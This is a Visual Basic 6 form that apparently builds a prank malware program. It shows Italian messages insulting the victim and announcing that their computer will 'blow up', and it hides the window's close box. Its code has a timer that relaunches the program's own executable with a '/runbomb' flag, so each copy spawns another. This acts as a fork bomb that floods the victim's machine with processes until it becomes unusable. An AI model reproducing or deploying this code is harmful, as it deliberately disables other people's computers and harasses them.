VERSION 5.00
Begin VB.Form Form1 
   ClientHeight    =   5760
   ClientLeft      =   60
   ClientTop       =   60
   ClientWidth     =   10125
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   ScaleHeight     =   5760
   ScaleWidth      =   10125
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   0
      Top             =   0
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "beh almeno cosi smetti di rubarmi i soldi della pension"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   1335
      Left            =   360
      TabIndex        =   3
      Top             =   3600
      Width           =   7095
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "il tuo coso sta per sciopare in aria. sei un pirla!"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   21.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   1335
      Left            =   360
      TabIndex        =   2
      Top             =   2400
      Width           =   7095
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Soi la Gianpiertolda"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   36
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFF80&
      Height          =   1095
      Left            =   360
      TabIndex        =   1
      Top             =   1320
      Width           =   7095
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Ciao"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   36
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   855
      Left            =   360
      TabIndex        =   0
      Top             =   360
      Width           =   1695
   End
   Begin VB.Image Image1 
      Height          =   5760
      Left            =   0
      Picture         =   "Form1.frx":0000
      Stretch         =   -1  'True
      Top             =   0
      Width           =   10200
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
  Form1.Visible = True
  Shell "ping localhost -n 2", vbHide
  Me.Caption = App.EXEName
  Timer1.Enabled = True
End Sub

Private Sub Timer1_Timer()
  Shell App.EXEName & " /runbomb"
  Timer1.Enabled = False
End Sub
